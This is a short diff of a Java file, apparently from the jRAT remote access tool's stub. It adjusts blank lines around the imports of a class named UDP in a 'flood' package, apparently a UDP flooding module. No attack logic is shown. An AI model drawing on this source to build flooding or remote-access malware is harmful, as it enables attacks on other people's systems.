@@ -1,11 +1,11 @@
 package pro.jrat.stub.flood;
+
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.InetAddress;
 import java.util.Random;
 
 import pro.jrat.stub.Constants;
-
 
 public class UDP implements Runnable {
 
